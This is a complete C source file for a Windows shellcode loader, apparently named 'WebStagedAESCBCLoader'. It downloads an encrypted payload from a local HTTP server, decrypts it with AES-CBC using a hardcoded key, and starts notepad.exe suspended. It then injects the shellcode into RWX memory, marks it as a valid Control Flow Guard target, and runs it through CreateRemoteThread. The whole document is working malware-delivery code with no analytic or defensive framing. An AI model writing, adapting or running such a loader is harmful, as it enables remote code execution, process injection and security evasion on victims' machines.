#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include <wininet.h>
#include <Tlhelp32.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")


typedef BOOL(WINAPI* fnSetProcessValidCallTargets)(
    HANDLE hProcess,
    PVOID VirtualAddress,
    SIZE_T RegionSize,
    ULONG NumberOfOffsets,
    PCFG_CALL_TARGET_INFO OffsetInformation);

#define PAYLOAD_KEY_SIZE 32
#define PAYLOAD_IV_SIZE 16
#define TEMP_BUFFER_SIZE 4096
#define MIN_PAYLOAD_SIZE 16

// cleanup function to reduce code duplication
void CleanupResources(
    HINTERNET hInternet,
    HINTERNET hUrl,
    PBYTE pPayload,
    PBYTE pPlainText,
    BCRYPT_KEY_HANDLE hKey,
    BCRYPT_ALG_HANDLE hAlg,
    HANDLE hProc,
    HANDLE hMainThread,
    HANDLE hThread,
    BOOL bTerminateProcess)
{
    if (hThread) CloseHandle(hThread);
    if (hMainThread) {
        if (bTerminateProcess && hProc) TerminateProcess(hProc, 0);
        CloseHandle(hMainThread);
    }
    if (hProc) CloseHandle(hProc);
    if (pPlainText) HeapFree(GetProcessHeap(), 0, pPlainText);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pPayload) HeapFree(GetProcessHeap(), 0, pPayload);
    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);
}

int main(void)
{
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    PBYTE pPayload = NULL;
    PBYTE pPlainText = NULL;
    DWORD dwTotalSize = 0;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    HANDLE hMainThread = NULL;
    PROCESS_INFORMATION pi = { 0 };
    NTSTATUS status = 0;

    hInternet = InternetOpenW(L"WebStagedAESCBCLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        printf("(!) InternetOpenW failed\n");
        return 1;
    }

    hUrl = InternetOpenUrlW(hInternet, L"http://localhost:8000/calc.bin.enc", NULL, 0,
                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        printf("(!) InternetOpenUrlW failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    // download encrypted payload (using local python server for testing)
    BYTE tempBuffer[TEMP_BUFFER_SIZE];
    DWORD dwChunkSize = 0;

    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &dwChunkSize)) {
        if (dwChunkSize == 0) break;

        PBYTE pNew = (pPayload == NULL) ?
            (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwChunkSize) :
            (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPayload, dwTotalSize + dwChunkSize);

        if (!pNew) {
            CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
            return 1;
        }

        pPayload = pNew;
        memcpy(pPayload + dwTotalSize, tempBuffer, dwChunkSize);
        dwTotalSize += dwChunkSize;
    }

    if (dwTotalSize < MIN_PAYLOAD_SIZE) {
        printf("(!) payload too small\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    // initialize AES-CBC decryption
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status < 0) {
        printf("(!) BCryptOpenAlgorithmProvider failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status < 0) {
        printf("(!) BCryptSetProperty failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    BYTE key[PAYLOAD_KEY_SIZE] = {
        0x9f,0x2e,0x7c,0x4b,0xa1,0xd5,0x68,0x3f,0xe6,0x12,0x9c,0x75,0x4d,0xb8,0x03,0xe1,
        0x2a,0x6f,0x9d,0x14,0x8b,0xc7,0x5e,0x30,0xf4,0x81,0x26,0x5a,0xd9,0x7b,0xc0,0x18
    };
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
    if (status < 0) {
        printf("(!) BCryptGenerateSymmetricKey failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    BYTE iv[PAYLOAD_IV_SIZE];
    memcpy(iv, pPayload, PAYLOAD_IV_SIZE);

    ULONG psize = 0, rsize = 0;

    // query required plaintext size
    status = BCryptDecrypt(hKey, pPayload + PAYLOAD_IV_SIZE, dwTotalSize - PAYLOAD_IV_SIZE, NULL, iv, PAYLOAD_IV_SIZE, NULL, 0, &psize, BCRYPT_BLOCK_PADDING);
    if (status < 0) {
        printf("(!) BCryptDecrypt (size query) failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    pPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, psize);
    if (!pPlainText) {
        printf("(!) HeapAlloc failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    // re-copy IV - BCryptDecrypt updates the IV buffer in CBC mode
    memcpy(iv, pPayload, PAYLOAD_IV_SIZE);

    status = BCryptDecrypt(hKey, pPayload + PAYLOAD_IV_SIZE, dwTotalSize - PAYLOAD_IV_SIZE, NULL, iv, PAYLOAD_IV_SIZE, pPlainText, psize, &rsize, BCRYPT_BLOCK_PADDING);
    if (status < 0) {
        printf("(!) BCryptDecrypt failed\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    printf("(+) Decrypted %lu bytes\n", rsize);
    if (rsize == 0) {
        printf("(!) decryption produced 0 bytes\n");
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    // spawn suspended target process
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("(!) CreateProcessW(notepad.exe) failed. E\error=%lu\n", GetLastError());
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
        return 1;
    }

    hProc = pi.hProcess;
    hMainThread = pi.hThread;
    printf("(+) spawned suspended notepad.exe PID: %lu\n", pi.dwProcessId);

    // remote code injection
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, rsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        printf("(!) VirtualAllocEx failed. Error=%lu\n", GetLastError());
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
        return 1;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, pRemote, pPlainText, rsize, &written) || written != rsize) {
        printf("(!) WriteProcessMemory failed. Error=%lu\n", GetLastError());
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
        return 1;
    }

    if (!FlushInstructionCache(hProc, pRemote, rsize)) {
        printf("(!) FlushInstructionCache failed. Error=%lu\n", GetLastError());
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
        return 1;
    }

    // set CFG (Control Flow Guard) call targets
    fnSetProcessValidCallTargets pSetProcessValidCallTargets =
        (fnSetProcessValidCallTargets)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessValidCallTargets");
    if (pSetProcessValidCallTargets) {
        CFG_CALL_TARGET_INFO cfgInfo = { 0, CFG_CALL_TARGET_VALID };
        if (!pSetProcessValidCallTargets(hProc, pRemote, rsize, 1, &cfgInfo))
            printf("(!) SetProcessValidCallTargets failed. Error=%lu (continuing)\n", GetLastError());
    }

    // create and execute remote thread
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
    if (!hThread) {
        printf("(!) CreateRemoteThread failed. Error=%lu\n", GetLastError());
        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
        return 1;
    }

    ResumeThread(hMainThread);
    printf("(+) injected successfully - remote thread handle=%p\n", hThread);
    printf("(+) shellcode running in notepad process\n");

    WaitForSingleObject(hThread, 3000);

    // cleanup
    CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
    return 0;
}
